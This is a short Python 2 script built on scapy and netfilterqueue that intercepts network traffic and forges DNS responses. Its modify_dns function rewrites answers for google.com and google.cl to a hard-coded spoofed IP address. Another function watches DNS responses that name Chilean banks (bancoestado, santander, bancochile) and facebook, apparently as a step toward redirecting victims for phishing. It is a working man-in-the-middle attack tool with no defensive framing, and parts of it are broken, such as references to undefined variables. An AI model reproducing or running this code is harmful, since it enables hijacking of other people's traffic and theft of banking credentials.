from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import requests

dns_hosts = {
    b"www.google.com." : "144.217.66.188",
    b"google.com." : "144.217.66.188",
    b"google.cl." : "144.217.66.188",
    b"www.google.cl." : "144.217.66.188"
}

def raw_verify(packet):
    """
    Verifica que el paquete contiene payload o data.
    """
    try:
        if Raw in packet :
            # Drop all packets coming from this IP
            print "The packet contains raw payload."
            #content = packet[Raw].load
            print packet.hexraw()
            payload.set_verdict(nfqueue.NF_ACCEPT)
        else:
            # Let the rest go it's way
            payload.set_verdict(nfqueue.NF_ACCEPT)
        # If you want to modify the packet, copy and modify it with scapy then do :
        #payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(packet), len(packet))    
    except KeyboardInterrupt:
        return


def print_and_accept_dnsQr(pkt):
    try:
        recon_webs = ["bancoestado", "google", "santander", "facebook", "www", "ww3", "chile","bancochile","es"]
        data = pkt.get_payload()
        packet = IP(data) #crearmos objeto scapy IP
        if packet.haslayer(DNSRR):
            qname = packet[DNSQR].qname
            for aux in recon_webs:
                if aux in qname.split('.'):
                    print (packet.summary())
                    #print "[*] -> %s <- [*]" % qname
            pkt.accept()
        else:
            pkt.accept()
    except KeyboardInterrupt:
        sys.exit(0)

def print_packet(pkt):
    data = pkt.get_payload()
    packet = IP(data) #crearmos objeto scapy IP
    if packet.haslayer(DNSRR):
        #qname = packet[DNSQR].qname
        print packet[DNSRR].show()
        pkt.accept()
    else:
        pkt.accept()

def modify_dns(pkt):
    data = pkt.get_payload()
    packet = IP(data)
    if packet.haslayer(DNSRR):
        qname = packet[DNSQR].qname
        if qname not in dns_hosts:
            print("no modification:", qname)
            pkt.accept()
        else:
            # craft new ans"wer, overriding the original
            # setting the rdata for the IP we want to redirect (spoofed)
            packet[DNS].an = DNSRR(rrname=qname, rdata="185.88.181.9")
            # set the answer count to 1
            packet[DNS].ancount = 1
            # delete checksums and length of packet, because we have modified the packet
            # new calculations are required ( scapy will do automatically )
            del packet[IP].len
            del packet[IP].chksum
            del packet[UDP].len
            del packet[UDP].chksum
            # return the modified packet
            pkt.set_payload(str(packet))
            pkt.accept()
    else:
        pkt.accept()

def troll(pkt):
    pkt.drop()